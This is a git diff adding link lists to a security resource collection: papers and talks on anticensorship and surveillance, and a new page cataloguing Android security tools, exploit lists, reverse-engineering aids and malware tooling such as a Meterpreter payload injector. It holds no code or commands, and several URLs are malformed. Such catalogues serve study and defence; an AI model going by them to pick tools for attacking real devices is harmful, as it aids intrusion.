+* [TapDance: End-to-Middle Anticensorship without Flow Blocking](https://jhalderm.com/pub/papers/tapdance-sec14.pdf)
+
+  * In response to increasingly sophisticated state-sponsored Internet
+    censorship, recent work has proposed a new ap- proach to censorship
+    resistance: end-to-middle proxying. This concept, developed in systems such
+    as Telex, Decoy Routing, and Cirripede, moves anticensorship technology into
+    the core of the network, at large ISPs outside the censoring country. In
+    this paper, we focus on two technical obstacles to the deployment of certain
+    end-to-middle schemes: the need to selectively block flows and the need to
+    observe both directions of a connection. We propose a new construction,
+    TapDance, that removes these require- ments. TapDance employs a novel
+    TCP-level technique that allows the anticensorship station at an ISP to
+    function as a passive network tap, without an inline blocking com- ponent.
+    We also apply a novel steganographic encoding to embed control messages in
+    TLS ciphertext, allowing us to operate on HTTPS connections even under
+    asymmetric routing. We implement and evaluate a TapDance proto- type that
+    demonstrates how the system could function with minimal impact on an ISP’s
+    network operations.
+
+* [Chipping Away at Censorship Firewalls with User-Generated Content](https://www.usenix.org/legacy/event/sec10/tech/full_papers/Burnett.pdf)
+
+  * Oppressive regimes and even democratic governments restrict Internet access.
+    Existing anti-censorship systems often require users to connect through
+    proxies, but these systems are relatively easy for a censor to discover and
+    block. This paper offers a possible next step in the cen- sorship arms race:
+    rather than relying on a single system or set of proxies to circumvent
+    censorship firewalls, we explore whether the vast deployment of sites that
+    host user-generated content can breach these firewalls. To explore this
+    possibility, we have developed Collage, which allows users to exchange
+    messages through hidden chan- nels in sites that host user-generated
+    content. Collage has two components: a message vector layer for embedding
+    content in cover traffic; and a rendezvous mechanism to allow parties to
+    publish and retrieve messages in the cover traffic. Collage uses
+    user-generated content (e.g. , photo-sharing sites) as “drop sites” for
+    hidden messages. To send a message, a user embeds it into cover traffic and
+    posts the content on some site, where receivers retrieve this content using
+    a sequence of tasks. Collage makes it difficult for a censor to monitor or
+    block these messages by exploiting the sheer number of sites where users can
+    exchange messages and the variety of ways that a mes- sage can be hidden.
+    Our evaluation of Collage shows that the performance overhead is acceptable
+    for sending small messages (e.g. , Web articles, email). We show how Collage
+    can be used to build two applications: a direct messaging application, and a
+    Web content delivery sys- tem
+
+* [Unblocking the Internet: Social networks foil censors](http://kscope.news.cs.nyu.edu/pub/TR-2008-918.pdf)
+
+  * Many countries and administrative domains exploit control over their
+    communication infrastructure to censor online content. This paper presents
+    the design, im plementation and evaluation of Kaleidoscope , a peer-to-peer
+    system of relays that enables users within a censored domain to access
+    blocked content. The main challenge facing Kaleidoscope is to resist the
+    cens or’s efforts to block the circumvention system itself. Kaleidoscope
+    achieves blocking-resilienc e using restricted service discovery that allows
+    each user to discover a small set of unblocked relays while only exposing a
+    small fraction of relays to the censor. To restrict service discovery,
+    Kaleidoscope leverages a trust network where links reflects real-world
+    social relationships among users and uses a limited advertisement protocol
+    based on random routes to disseminate relay addresses along the trust netwo
+    rk; the number of nodes reached by a relay advertisement should ideally be
+    inversely proportional to the maximum fraction of infiltration and is
+    independent of the network size. To increase service availa bility in large
+    networks with few exit relay nodes, Kaleidoscope forwards the actual data
+    traffic across multiple relay hops without risking exposure of exit relays.
+    Using detailed analysis and simulations, we show that Kalei doscope
+    provides > 90% service availability even under substantial infiltration
+    (close to 0.5% of edges) and when only 30% of the relay nodes are online. We
+    have implemented and deployed our system on a small scale serving over
+    100,000 requests to 40 censored users (relatively small user base to realize
+    Kaleidoscope’s anti-blocking guarantees) spread across different countries
+    and administrative domains over a 6-month period
+
+* [A Technical Description of Psiphon](https://psiphon.ca/en/blog/psiphon-a-technical-description)
+* [Discovering Browser Extensions via Web Accessible Resources - Chalmers security lab](http://www.cse.chalmers.se/research/group/security/publications/2017/extensions/codaspy-17-full.pdf)
+
+#### Talks & Videos (& Presentations)
+
+* [Cookieless Monster: Exploring the Ecosystem of Web-based Device Fingerprinting](http://securitee.org/files/cookieless_sp2013.pdf)
+* [Because Jail is for WUFTPD - Legendary talk, a must watch.](https://www.youtube.com/watch?v=9XaYdCdwiWU)
+* [The Gruqgs blog](http://grugq.tumblr.com/)
+* [COMSEC: Beyond encryption](https://grugq.github.io/presentations/COMSEC%20beyond%20encryption.pdf)
+* [DEFCON 20: Can You Track Me Now? Government And Corporate Surveillance Of Mobile Geo-Location Data](https://www.youtube.com/watch?v=NjuhdKUH6U4)
+* [Detecting and Defending Against a Surveillance State - DEFCON 22 - Robert Rowley](https://www.youtube.com/watch?v=d5jqV06Yijw)
+* [Detecting and Defending Against a Surveillance State - Robert Rowley - DEF CON 22](https://www.youtube.com/watch?v=d5jqV06Yijw)
+* [The NSA: Capabilities and Countermeasures - ShmooCon 2014](https://www.youtube.com/watch?v=D5JA8Ytk9EI)
+* [Blinding The Surveillance State - Christopher Soghoian - DEF CON 22](https://www.youtube.com/watch?v=pM8e0Dbzopk)
+* [Client Identification Mechanisms](http://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
+* [Can you track me now? - Defcon20](https://wEww.youtube.com/watch?v=DxIF66Tcino)
+* [Phones and Privacy for Consumers - Matt Hoy (mattrix) and David Khudaverdyan (deltaflyer)](http://www.irongeek.com/i.php?page=videos/grrcon2015/submerssion-therapy05-phones-and-privacy-for-consumers-matt-hoy-mattrix-and-david-khudaverdyan-deltaflyerhttps://ritter.vg/blog-deanonymizing_amm.html)
+* [Retail Surveillance / Retail Countersurveillance 50 most unwanted retail surveillance technologies / 50 most wanted countersurveillance technologies](https://media.ccc.de/v/33c3-8238-retail_surveillance_retail_countersurveillance#video&t=1993)
+* [OPSEC Concerns in Using Crypto](https://www.slideshare.net/JohnCABambenek/defcon-crypto-village-opsec-concerns-in-using-crypto)
+* [De-Anonymizing Alt.Anonymous. Messages - Defcon21 - Tom Ritter](https://www.youtube.com/watch?v=_Tj6c2Ikq_E)
+* [PISSED: Privacy In a Surveillance State Evading Detection - Joe Cicero - CYPHERCON11 ](https://www.youtube.com/watch?v=keA3WcKwZwA)
+* [What Happens Next Will Amaze You](http://idlewords.com/talks/what_happens_next_will_amaze_you.htm#six_fixes)
+* [Wifi Tracking: Collecting the (probe) Breadcrumbs - David Switzer](https://www.youtube.com/watch?v=HzQHWUM8cNo)
+
+  * Wifi probes have provided giggles via Karma and Wifi Pineapples for years,
+    but is there more fun to be had? Like going from sitting next to someone on
+    a bus, to knowing where they live and hang out? Why try to MITM someone’s
+    wireless device in an enterprise environment where they may notice — when
+    getting them at their favorite burger joint is much easier. In this talk we
+    will review ways of collecting and analyzing probes. We’ll use the resulting
+    data to figure out where people live, their daily habits, and discuss uses
+    (some nice, some not so nice) for this information. We’ll also dicuss how to
+    make yourself a little less easy to track using these methods. Stingrays are
+    price prohibitive, but for just tracking people’s movements.. this is cheap
+    and easy.
+
+* [How Tor Users Got Caught - Defcon 22](https://www.youtube.com/watch?v=7G1LjQSYM5Q) \*
+  [Part 2](https://www.youtube.com/watch?v=TQ2bk9kMneI)
+* [Article - How Tor Users Got Caught by Government Agencies](http://se.azinstall.net/2015/11/how-tor-users-got-caught.html)
+* [You Are Being Tracked: How License Plate Readers Are Being Used to Record Americans' Movements - ACLU](https://www.aclu.org/other/you-are-being-tracked-how-license-plate-readers-are-being-used-record-americans-movements?redirect=technology-and-liberty/you-are-being-tracked-how-license-plate-readers-are-being-used-record)
+* [Deep Dive Into Tor Onion Services - David Goulet](https://www.youtube.com/watch?v=AkoyCLAXVsc)
+* [Winning and Quitting the Privacy Game What it REALLY takes to have True Privacy in the 21st Century - Derbycon 7](https://www.youtube.com/watch?v=bxQSu06yuZc)
+
+#### Tools
+
+* [FakeNameGenerator](http://www.fakenamegenerator.com/)
+* [MAT: Metadata Anonymisation Toolkit](https://mat.boum.org/)
+
+  * MAT is a toolbox composed of a GUI application, a CLI application and a
+    library.
+
+* [fteproxy](https://fteproxy.org/about)
+
+  * fteproxy is fast, free, open source, and cross platform. It has been shown
+    to circumvent network monitoring software such as bro, YAF, nProbe,
+    l7-filter, and appid, as well as closed-source commercial DPI systems
+
+* [Streisand](https://github.com/jlund/streisand)
+
+  * Streisand sets up a new server running L2TP/IPsec, OpenSSH, OpenVPN,
+    Shadowsocks, sslh, Stunnel, and a Tor bridge. It also generates custom
+    configuration instructions for all of these services. At the end of the run
+    you are given an HTML file with instructions that can be shared with
+    friends, family members, and fellow activists.
+
+* [exitmap](https://github.com/NullHypothesis/exitmap)
+
+  * Exitmap is a fast and modular Python-based scanner for Tor exit relays.
+    Exitmap modules implement tasks that are run over (a subset of) all exit
+    relays. If you have a background in functional programming, think of exitmap
+    as a map() interface for Tor exit relays. Modules can perform any TCP-based
+    networking task; fetching a web page, uploading a file, connecting to an SSH
+    server, or joining an IRC channel.
+
+* [OnionCat - an Anonymous VPN adapter](https://www.onioncat.org/about-onioncat/)
+* [howmanypeoplearearound](https://github.com/schollz/howmanypeoplearearound)
+
+  * Count the number of people around you ???????? by monitoring wifi signals ??
+
+* [Decentraleyes](https://addons.mozilla.org/en-US/firefox/addon/decentraleyes/)
+
+  * Protects you against tracking through "free", centralized, content delivery.
+    It prevents a lot of requests from reaching networks like Google Hosted
+    Libraries, and serves local files to keep sites from breaking. Complements
+    regular content blockers.
+
+* [Decentraleyes - Github](https://github.com/Synzvato/decentraleyes)
+
+  * A web browser extension that emulates Content Delivery Networks to improve
+    your online privacy. It intercepts traffic, finds supported resources
+    locally, and injects them into the environment. All of this happens
+    automatically, so no prior configuration is required.
+
+* [Destroy-Windows-10-Spying](https://github.com/Nummer/Destroy-Windows-10-Spying)
+
+  * Destroy Windows Spying tool
+
+* [meek](https://github.com/Yawning/meek)
+
+  * meek is a blocking-resistant pluggable transport for Tor. It encodes a data
+    stream as a sequence of HTTPS requests and responses. Requests are reflected
+    through a hard-to-block third-party web server in order to avoid talking
+    directly to a Tor bridge. HTTPS encryption hides fingerprintable byte
+    patterns in Tor traffic.sek
+
+* [HTTPLeaks](https://github.com/cure53/HTTPLeaks)
+
+  * HTTPLeaks - All possible ways, a website can leak HTTP requests
+
+#### Misc
+
+* [.NET Github: .NET core should not SPY on users by default #3093](https://github.com/dotnet/cli/issues/3093)
+* [.NET Github: Revisit Telemetry configuration #6086 ](https://github.com/dotnet/cli/issues/6086)
diff --git a/source/Attacking-Defending-Android.md b/source/Attacking-Defending-Android.md
new file mode 100644
index 0000000..5f14096
--- /dev/null
+++ b/source/Attacking-Defending-Android.md
@@ -0,0 +1,744 @@
+## Attacking Android Devices
+
+### Table of Contents
+
+* [Cull](#Cull)
+* [Intro](#Intro)
+* [Android Internals](#AInternals)
+* [Securing Android](#SecAnd)
+* [Android Apps](#Apps)
+* [Vulnerabilities](#Vulns)
+* [Exploits](#Exploits)
+* [Device Analysis](#DAnalysis)
+* [Application Analysis](#AppAnalysis)
+  * Dynamic Analysis
+  * Static Analysis
+* [Online APK Analyzers](#OnlineAPK)
+* [Attack Platforms](#APlatforms)
+* [Android Malware](#Malware)
+* [Reverse Engineering Android](#RE)
+* [Interesting Papers](#Papers)
+* [Write-ups](#Write)
+* [Educational Materials](#Education)
+* [Books](#Books)
+* [Other](#Other)
+
+#### Cull
+
+* [When 'EFBFBD' and Friends Come Knocking: Observations of Byte Array to String Conversions](https://blog.gdssecurity.com/labs/2015/2/18/when-efbfbd-and-friends-come-knocking-observations-of-byte-a.html)
+
+* [Intercepting HTTPS traffic of Android Nougat Applications](https://serializethoughts.com/2016/09/10/905/)
+
+  * TL;DR To intercept network traffic for Android 7.0 targeted applications,
+    introduce a res/xml/network_security_config.xml file.
+
+* http://nelenkov.blogspot.com
+
+* [Add Security Exception to APK](https://github.com/levyitay/AddSecurityExceptionAndroid)
+
+* [DonkeyGuard](https://github.com/CollegeDev/DonkeyGuard/)
+
+  * DonkeyGuard allows you a fine-grained tuning of access to your private data.
+    It currently supports 41 restrictions which can be applied for every
+    application. Specifically, it is a Privacy service provider which implements
+    a set of modifications to the Android Framework to allow you to interact
+    with applications which are trying to access your private data.
+
+* [The Android boot process](https://thecyberfibre.com/android-boot-process/)
+
+* [Miroslav Stampar - Android: Practical Introduction into the (In)Security](https://www.youtube.com/watch?v=q1_rvrY4VHI)
+
+  * This presentation covers the user’s deadly sins of Android (In)Security,
+    together with implied system security problems. Each topic could potentially
+    introduce unrecoverable damage from security perspective. Both local and
+    remote attacks are covered, along with accompanying practical demo of most
+    interesting ones.
+
+### General
+
+* [Droidsec - Pretty much should be your first stop](http://www.droidsec.org/wiki/)
+
+* [Hacking Your Way Up The Mobile Stack](http://vimeo.com/51270090)
+
+* [csploit](http://www.csploit.org/docs.html)
+
+  * "The most complete and advanced IT security professional toolkit on
+    Android."(From their site)
+  * [Github Link](https://github.com/cSploit/android/tree/master/cSploit)
+
+* [Mobile Application Penetration Testing Cheat Sheet](https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet)
+
+### Android Internals
+
+* [Dalvik opcodes](http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html)
+
+* [Dalvik Bytecode Format docs](http://source.android.com/devices/tech/dalvik/dex-format.html)
+
+* [The Android boot process from power on](http://www.androidenea.com/2009/06/android-boot-process-from-power-on.html)
+
+* [Trusted Execution Environments and Android](https://usmile.at/sites/default/files/androidsecuritysymposium/presentations/Ekberg_AndroidAndTrustedExecutionEnvironments.pdf)
+
+### Securing Android
+
+* [Android (In)Security (Defcamp 2014)](https://www.youtube.com/watch?v=2aeV1JXYvuQ&index=23&list=PLnwq8gv9MEKgSryzYIFhpmCcqnVzdUWfH)
+
+* [Android Forensics Class](http://opensecuritytraining.info/AndroidForensics.html)
+
+  * Free - This class serves as a foundation for mobile digital forensics,
+    forensics of Android operating systems, and penetration testing of Android
+    applications.
+
+* [Android Hardening Guide by the TOR developers](https://blog.torproject.org/blog/mission-impossible-hardening-android-security-and-privacy)
+
+  * This blog post describes the installation and configuration of a prototype
+    of a secure, full-featured, Android telecommunications device with full Tor
+    support, individual application firewalling, true cell network baseband
+    isolation, and optional ZRTP encrypted voice and video support. ZRTP does
+    run over UDP which is not yet possible to send over Tor, but we are able to
+    send SIP account login and call setup over Tor independently. The SIP client
+    we recommend also supports dialing normal telephone numbers if you have a
+    SIP gateway that provides trunking service. Aside from a handful of binary
+    blobs to manage the device firmware and graphics acceleration, the entire
+    system can be assembled (and recompiled) using only FOSS components.
+    However, as an added bonus, we will describe how to handle the Google Play
+    store as well, to mitigate the two infamous Google Play Backdoors.
+
+* [Android 4.0+ Hardening Guide/Checklist by University of Texas](https://wikis.utexas.edu/display/ISO/Google+Android+Hardening+Checklist)
+
+* [Mobile self-defense - Karsten Nohl](https://www.youtube.com/watch?v=GeCkO0fWWqc)
+
+#### Applications
+
+* [Android Firewall(Requires Root)](https://play.google.com/store/apps/details?id=com.jtschohl.androidfirewall&hl=en)
+
+* Xprivacy - The Ultimate Android Privacy Manager(Requires Root
+
+  * [Github](https://github.com/M66B/XPrivacy)
+  * [Google Play](https://play.google.com/store/apps/details?id=biz.bokhorst.xprivacy.installer&hl=en)
+
+#### Backups
+
+* [Titanium Backup](https://play.google.com/store/apps/details?id=com.keramidas.TitaniumBackup)
+
+  * Personal favorite for making backups. Backups are stored locally or
+    automatically to various cloud services.
+
+* [Helium Backup(Root Not Required)](https://play.google.com/store/apps/details?id=com.koushikdutta.backup&hl=en) \*
+
+  * Backs up data locally or to various cloud services. Local client available
+    for backups directly to PC.
+
+* [Stunneller](https://github.com/ultramancool/Stunneler)
+
+  * Android app for easy stunnel usage
+
+### Encryption
+
+* Check the Encryption section of the overall guide for more information.
+
+* [Android Reverse Engineering Defenses](https://bluebox.com/wp-content/uploads/2013/05/AndroidREnDefenses201305.pdf)
+
+#### Vulnerabilities
+
+* [List of Android Vulnerabilities](http://androidvulnerabilities.org/all)
+* [AndroBugs Framework](https://github.com/AndroBugs/AndroBugs_Framework)
+
+  * AndroBugs Framework is an Android vulnerability analysis system that helps
+    developers or hackers find potential security vulnerabilities in Android
+    applications
+
+#### Exploits
+
+* [List of Android Exploits](https://github.com/droidsec/droidsec.github.io/wiki/Vuln-Exploit-List)
+* [Android_Kernel_CVE_POC](https://github.com/ScottyBauer/Android_Kernel_CVE_POCs)
+* [plzdonthack.me](https://plzdonthack.me/)
+
+  * Personal site of Scotty Bauer
+
+### Device Analysis
+
+* [android-cluster-toolkit](https://github.com/jduck/android-cluster-toolkit)
+
+  * The Android Cluster Toolkit helps organize and manipulate a collection of
+    Android devices. It was designed to work with a collection of devices
+    connected to the same host machine, either directly or via one or more tiers
+    of powered USB hubs. The tools within can operate on single devices, a
+    selected subset, or all connected devices at once.
+
+* [privmap - android](https://github.com/jduck/privmap)
+
+  * A tool for enumerating the effective privileges of processes on an Android
+    device.
+
+* [canhazaxs](https://github.com/jduck/canhazaxs)
+
+  * A tool for enumerating the access to entries in the file system of an
+    Android device.
+
+* [Android Device Testing Framework(DTF)](https://github.com/jakev/dtf/tree/v1.0.3)
+
+  * The Android Device Testing Framework ("dtf") is a data collection and
+    analysis framework to help individuals answer the question: "Where are the
+    vulnerabilities on this mobile device?" Dtf provides a modular approach and
+    built-in APIs that allows testers to quickly create scripts to interact with
+    their Android devices. The default download of dtf comes with multiple
+    modules that allow testers to obtain information from their Android device,
+    process this information into databases, and then start searching for
+    vulnerabilities (all without requiring root privileges). These modules help
+    you focus on changes made to AOSP components such as applications,
+    frameworks, system services, as well as lower-level components such as
+    binaries, libraries, and device drivers. In addition, you'll be able to
+    analyze new functionality implemented by the OEMs and other parties to find
+    vulnerabilities.
+
+* [drozer](https://github.com/mwrlabs/drozer)
+
+  * drozer allows you to search for security vulnerabilities in apps and devices
+    by assuming the role of an app and interacting with the Dalvik VM, other
+    apps' IPC endpoints and the underlying OS.
+
+### Application Analysis
+
+* [APK Studio - Android Reverse Engineering](https://apkstudio.codeplex.com/)
+
+  * APK Studio is an IDE for decompiling/editing & then recompiling of android
+    application binaries. Unlike initial release being Windows exclusive & also
+    didn't support frameworks, this one is completely re-written using QT for
+    cross-platform support. You can now have multiple frameworks installed &
+    pick a particular one on a per project basis.
+
+* [Smali Control-Flow-Graphs](https://github.com/EugenioDelfa/Smali-CFGs)
+
+* [PID Cat](https://github.com/JakeWharton/pidcat)
+
+  * An update to Jeff Sharkey's excellent logcat color script which only shows
+    log entries for processes from a specific application package. During
+    application development you often want to only display log messages coming
+    from your app. Unfortunately, because the process ID changes every time you
+    deploy to the phone it becomes a challenge to grep for the right thing. This
+    script solves that problem by filtering by application package. Supply the
+    target package as the sole argument to the python script and enjoy a more
+    convenient development process.
+
+* [AndBug - Scriptable Android Debugger](https://github.com/swdunlop/AndBug)
+
+  * AndBug is a debugger targeting the Android platform's Dalvik virtual machine
+    intended for reverse engineers and developers. It uses the same interfaces
+    as Android's Eclipse debugging plugin, the Java Debug Wire Protocol (JDWP)
+    and Dalvik Debug Monitor (DDM) to permit users to hook Dalvik methods,
+    examine process state, and even perform changes.
+
+* [android-lkms](https://github.com/strazzere/android-lkms)
+
+  * Android Loadable Kernel Modules - mostly used for reversing and debugging on
+    controlled systems/emulators.
+
+* [Simplify - Simple Android De-obfuscator](https://github.com/CalebFenton/simplify)
+
+  * Simplify uses a virtual machine to understand what an app does. Then, it
+    applies optimizations to create code that behaves identically, but is easier
+    for a human to understand. Specifically, it takes Smali files as input and
+    outputs a Dex file with (hopefully) identical semantics but less complicated
+    structure.
+
+* [Cuckoo-Droid](https://github.com/i[danr1986/cuckoo-droid/blob/master/README.md)
+
+  * CuckooDroid is an extension of Cuckoo Sandbox the Open Source software for
+    automating analysis of suspicious files, CuckooDroid brigs to cuckoo the
+    capabilities of execution and analysis of android application.
+
+* [elsim - Elements Similarities](https://code.google.com/p/elsim/wiki/Similarity#Diffing_of_applications)
+
+  * Similarities/Differences of applications (aka rip-off indicator)
+  * This tool detects and reports: the identical methods; the similar methods;
+    the deleted methods; the new methods; the skipped methods.
+
+### Dynamic Analysis
+
+* [APKInspector](https://github.com/honeynet/apkinspector)
+
+  * APKinspector is a powerful GUI tool for analysts to analyze the Android
+    applications.
+
+* [DroidBox](https://code.google.com/p/droidbox/)
+  * DroidBox is developed to offer dynamic analysis of Android applications.
+    Additionally, two images are generated visualizing the behavior of the
+    package. One showing the temporal order of the operations and the other one
+    being a treemap that can be used to check similarity between analyzed
+    packages.
+* [ddi - Dynamic Dalvik Instrumentation Toolkit](ttps://github.com/crmulliner/ddi)
+
+  * Simple and easy to use toolkit for dynamic instrumentation of Dalvik code.
+    Instrumentation is based on library injection and hooking method entry
+    points (in-line hooking). The actual instrumentation code is written using
+    the JNI interface. The DDI further supports loading additional dex classes
+    into a process. This enables instrumentation code to be partially written in
+    Java and thus simplifies interacting with the instrumented process and the
+    Android framework.
+
+* [Hooker](https://github.com/AndroidHooker/hooker)
+
+  * Hooker is an opensource project for dynamic analyses of Android
+    applications. This project provides various tools and applications that can
+    be use to automaticaly intercept and modify any API calls made by a targeted
+    application. It leverages Android Substrate framework to intercept these
+    calls and aggregate all their contextual information (parameters, returned
+    values, ...). Collected information can either be stored in a distributed
+    database (e.g. ElasticSearch) or in json files. A set of python scripts is
+    also provided to automatize the execution of an analysis to collect any API
+    calls made by a set of applications.
+
+* [Android-SSL-TrustKiller](https://github.com/iSECPartners/Android-SSL-TrustKiller)
+
+  * Blackbox tool to bypass SSL certificate pinning for most applications
+    running on a device.
+
+* [JustTrustMe - Cert Pinning using Xposed](https://github.com/fuzion24/justtrustme)
+
+  * An xposed module that disables SSL certificate checking. This is useful for
+    auditing an appplication which does certificate pinning. You can read about
+    the practice of cert pinning here(1). There also exists a nice framework
+    built by @moxie to aid in pinning certs in your app: certificate pinning
+
+- [AndroidPinning](https://github.com/moxie0/AndroidPinning)
+
+  * AndroidPinning is a standalone Android library project that facilitates
+    certificate pinning for SSL connections from Android apps, in order to
+    minimize dependence on Certificate Authorities.
+
+- [AndBug - A Scriptable Android Debugger](https://github.com/swdunlop/AndBug)
+
+  * AndBug is a debugger targeting the Android platform's Dalvik virtual machine
+    intended for reverse engineers and developers. It uses the same interfaces
+    as Android's Eclipse debugging plugin, the Java Debug Wire Protocol (JDWP)
+    and Dalvik Debug Monitor (DDM) to permit users to hook Dalvik methods,
+    examine process state, and even perform changes.
+
+- [android-gdb](https://github.com/darchons/android-gdb)
+
+  * GDB fork targetting Android/Fennec development
+
+- [How to avoid certificate pinning in the latest versions of Android](https://www.welivesecurity.com/2016/09/08/avoid-certificate-pinning-latest-versions-androidESET%20Blog:%20We%20Live%20Security)
+
+### Static Analysis
+
+* [Disect Android APKs like a Pro - Static code analysis](http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/)
+
+* [Androguard](https://code.google.com/p/androguard)
+
+  * Androguard is mainly a tool written in python to play with: Dex/Odex (Dalvik
+    virtual machine) (.dex) (disassemble, decompilation), APK (Android
+    application) (.apk), Android's binary xml (.xml), Android Resources (.arsc).
+    Androguard is available for Linux/OSX/Windows (python powered).
+
+* [Dexter](http://dexter.dexlabs.org/accounts/login/?next=/dashboard)
+
+  * Dexter is a static android application analysis tool.\
+
+- [Static Code Analysis of Major Android Web Browsers](http://opensecurity.in/research/security-analysis-of-android-browsers.html)
+
+- [Androwarn](https://github.com/maaaaz/androwarn)
+
+  * Androwarn is a tool whose main aim is to detect and warn the user about
+    potential malicious behaviours developped by an Android application. The
+    detection is performed with the static analysis of the application's Dalvik
+    bytecode, represented as Smali. This analysis leads to the generation of a
+    report, according to a technical detail level chosen from the user.
+
+- [Thresher](http://pl.cs.colorado.edu/projects/thresher/)
+
+  * Thresher is a static analysis tool that specializes in checking heap
+    reachability properties. Its secret sauce is using a coarse up-front
+    points-to analysis to focus a precise symbolic analysis on the alarms
+    reported by the points-to analysis.
+  * [[PAPER] Thresher: Precise Refutations for Heap Reachability](http://www.cs.colorado.edu/~sabl4745/papers/pldi13-thresher.pdf)
+
+* [lint - Static Analysis](https://developer.android.com/tools/help/lint.html)
+
+  * The Android lint tool is a static code analysis tool that checks your
+    Android project source files for potential bugs and optimization
+    improvements for correctness, security, performance, usability,
+    accessibility, and internationalization.
+
+* [Flow Droid - Taint Analysis](http://sseblog.ec-spride.de/tools/flowdroid/)
+
+  * FlowDroid is a context-, flow-, field-, object-sensitive and lifecycle-aware
+    static taint analysis tool for Android applications.
+
+  * [[PAPER] FlowDroid: Precise Context, Flow, Field, Object-sensitive and Lifecycle-aware Taint Analysis for Android Apps](http://www.bodden.de/pubs/far+14flowdroid.pdf)
+
+    * In this work we thus present F LOW D ROID , a novel and highly precise
+      static taint analysis for Android applications. A precise model of
+      Android’s lifecycle allows the analysis to properly handle callbacks
+      invoked by the Android framework, while context, flow, field and
+      object-sensitivity allows the analysis to reduce the number of false
+      alarms. Novel on-demand algorithms help F LOW D ROID maintain high
+      efficiency and precision at the same time.
+
+* [dedex](https://github.com/mariokmk/dedex)
+
+  * Is a command line tool for disassembling Android DEX files.
+
+* [DexMac](https://github.com/mariokmk/DexMac)
+
+  * Is a native OSX application for disassembling Android DEX files.
+
+* [dexdissasembler](https://github.com/mariokmk/dexdisassemble)
+
+  * Is a GTK tool for disassembling Android DEX files.
+
+* [dex.Net](https://github.com/mariokmk/dex.net)
+
+  * A Mono/.NET library to parse Android DEX files. Its main purpose is to
+    support utilities for disassembling and presenting the contents of DEX
+    files.
+
+* [apk2gold](https://github.com/lxdvs/apk2gold)
+
+  * CLI tool for decompiling Android apps to Java. It does resources! It does
+    Java! Its real easy!
+
+* [Android Unpacker presented at Defcon 22: Android Hacker Protection Level 0](https://github.com/strazzere/android-unpacker)
+
+* [byte-code viewer](https://github.com/Konloch/bytecode-viewer)
+
+  * Bytecode Viewer is an Advanced Lightweight Java Bytecode Viewer, GUI Java
+    Decompiler, GUI Bytecode Editor, GUI Smali, GUI Baksmali, GUI APK Editor,
+    GUI Dex Editor, GUI APK Decompiler, GUI DEX Decompiler, GUI Procyon Java
+    Decompiler, GUI Krakatau, GUI CFR Java Decompiler, GUI FernFlower Java
+    Decompiler, GUI DEX2Jar, GUI Jar2DEX, GUI Jar-Jar, Hex Viewer, Code
+    Searcher, Debugger and more. It's written completely in Java, and it's open
+    sourced. It's currently being maintained and developed by Konloch.
+
+* [Disect Android APKs like a Pro - Static code analysis](http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/)
+
+### Online APK Analyzers
+
+* [Mobile Sandbox](http://mobilesandbox.org/)
+
+  * Provide an Android application file (apk-file) and the Mobile-Sandbox will
+    analyze the file for any malicious behaviour.
+
+* [CopperDroid](http://copperdroid.isg.rhul.ac.uk/copperdroid/)
+
+  * Upload an .apk for static analysis
+
+* [Andrototal](http://andrototal.org/)
+
+  * AndroTotal is a free service to scan suspicious APKs against multiple mobile
+    antivirus apps.
+
+### Attack Platforms
+
+* [drozer](https://github.com/mwrlabs/drozer)
+
+  * drozer allows you to search for security vulnerabilities in apps and devices
+    by assuming the role of an app and interacting with the Dalvik VM, other
+    apps' IPC endpoints and the underlying OS.
+
+* [Android Tamer](http://androidtamer.com/)
+
+  * Android Tamer is a one stop tool required to perform any kind of operations
+    on Android devices / applications / network VM
+
+### Android Malware
+
+* [Rundown of Android Packers](http://www.fortiguard.com/uploads/general/Area41Public.pdf)
+* [APK File Infection on an Android System](]https://www.youtube.com/watch?v=HZI1hCdqKjQ&list=PLCDA5DF85AD6B4ABD)
+
+* [Manifesto](https://github.com/maldroid/manifesto)
+
+  * PoC framework for APK obfuscation, used to demonstrate some of the
+    obfuscation examples from http://maldr0id.blogspot.com. It supports plugins
+    (located in processing directory) that can do different obfuscation
+    techniques. Main gist is that you run manifesto on the APK file and it
+    produces an obfuscated APK file.
+
+* [Android Hacker Protection Level 0](https://www.youtube.com/watch?v=vLU92bNeIdI)
+
+  * DEF CON 22 - Tim Strazzere and Jon Sawyer - Obfuscator here, packer there -
+    the Android ecosystem is becoming a bit cramped with different protectors
+    for developers to choose. With such limited resources online about attacking
+    these protectors, what is a new reverse engineer to do? Have no fear, after
+    drinking all the cheap wine two Android hackers have attacked all the
+    protectors currently available for everyones enjoyment! Whether you've never
+    reversed Android before or are a hardened veteran there will be something
+    for you, along with all the glorious PoC tools and plugins for your little
+    heart could ever desire.
+
+* [kwetza](https://github.com/sensepost/kwetza)
+
+  * Python script to inject existing Android applications with a Meterpreter
+    payload.
+
+### Reverse Engineering Android
+
+* [APK Studio - Android Reverse Engineering](https://apkstudio.codeplex.com/)
+
+  * APK Studio is an IDE for decompiling/editing & then recompiling of android
+    application binaries. Unlike initial release being Windows exclusive & also
+    didn't support frameworks, this one is completely re-written using QT for
+    cross-platform support. You can now have multiple frameworks installed &
+    pick a particular one on a per project basis.
+
+* [Android apk-tool](https://code.google.com/p/android-apktool/)
+
+  * It is a tool for reverse engineering 3rd party, closed, binary Android apps.
+    It can decode resources to nearly original form and rebuild them after
+    making some modifications; it makes possible to debug smali code step by
+    step. Also it makes working with app easier because of project-like files
+    structure and automation of some repetitive tasks like building apk, etc.
+
+* [Reversing and Auditing Android’s Proprietary bits](http://www.slideshare.net/joshjdrake/reversing-and-auditing-androids-proprietary-bits)
+
+* [Smali](https://code.google.com/p/smali/)
+
+  * smali/baksmali is an assembler/disassembler for the dex format used by
+    dalvik, Android's Java VM implementation. The syntax is loosely based on
+    Jasmin's/dedexer's syntax, and supports the full functionality of the dex
+    format (annotations, debug info, line info, etc.)
+
+* [APKinpsector](https://github.com/honeynet/apkinspector/)
+
+  * APKinspector is a powerful GUI tool for analysts to analyze the Android
+    applications.
+
+* [Dexter](http://dexter.dexlabs.org/)
+
+  * Dexter is a static android application analysis tool.
+
+* [Reversing Android Apps Slides](http://www.floyd.ch/download/Android_0sec.pdf)
+
+* [AndroChef](http://androiddecompiler.com/)
+
+  * AndroChef Java Decompiler is Windows XP, Windows 2003, Windows Vista,
+    Windows 7, Windows 8, 8.1 decompiler for Java that reconstructs the original
